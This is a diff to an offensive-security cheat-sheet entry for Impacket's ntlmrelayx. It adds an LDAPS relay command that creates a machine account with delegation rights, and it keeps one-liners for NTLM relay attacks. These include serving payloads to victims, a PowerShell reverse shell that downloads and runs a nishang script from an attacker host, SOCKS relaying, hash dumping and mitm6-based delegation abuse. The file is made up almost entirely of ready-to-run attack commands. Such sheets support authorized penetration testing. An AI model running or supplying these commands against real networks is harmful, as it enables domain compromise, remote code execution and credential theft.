@@ -1,48 +1,39 @@
-# Impacket
+# ntlmrelayx (imp)
 
-## smbserver - share smb folder
-#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 
+% impacket-mitm, windows, smb, 445
 
-A Python implementation of an SMB server. Allows to quickly set up shares and user accounts.
-
+#plateform/linux  #target/remote #cat/ATTACK/RELAY
+## add computer
 ```
-smbserver.py <shareName> <sharePath>
+ntlmrelayx -t ldaps://<dc1> -smb2support --remove-mic --add-computer <computer_name> <computer_password> --delegate-access
 ```
-
-## smbserver - share smb folder with authentication
-#plateform/linux #target/serve #port/445 #protocol/smb #cat/ATTACK/LISTEN-SERVE 
-
-```
-smbserver.py -username <username> -password <password> <shareName> <sharePath>
-```
-
-## ntlmrelay - host a payload that will automatically be served to the remote host connecting
+## host a payload that will automatically be served to the remote host connecting
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 
 ```
 ntlmrelayx.py -tf <targets_file> -smb2support -e <payload_file|payload.exe>
 ```
 
-## ntlmrelay - reverseshell (nishang)
+## reverseshell (nishang)
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 Or powershell -e base64_string
 ```
 ntlmrelayx.py -tf <targets_file> -smb2support -c "powershell -c IEX(New-Object NET.WebClient).DownloadString('http://<ip>:<http_port>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress <ip> -Port <rport>"
 ```
 
-## ntlmrelay - socks
+## socks
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 ntlmrelayx.py -tf <targets_file> -socks -smb2support
 ```
 
-## ntlmrelay - authenticate and dump hash
+## authenticate and dump hash
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 ntlmrelayx.py -tf <targets_file> -smb2support
 ```
 
-## ntlmrelay - to use with mitm6 - relay to target
+## to use with mitm6 - relay to target
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 Next use the socks with proxychains : 
 proxychains smbclient //ip/Users -U domain/user
@@ -51,7 +42,7 @@ proxychains smbclient //ip/Users -U domain/user
 ntlmrelayx.py -6 -wh <attacker_ip> -t smb://<target> -l /tmp -socks -debug
 ```
 
-## ntlmrelay - to use with mitm6 - delegate access
+## to use with mitm6 - delegate access
 #plateform/linux #target/serve #cat/ATTACK/MITM 
 ```
 ntlmrelayx.py -t ldaps://<dc_ip> -wh <attacker_ip> --delegate-access
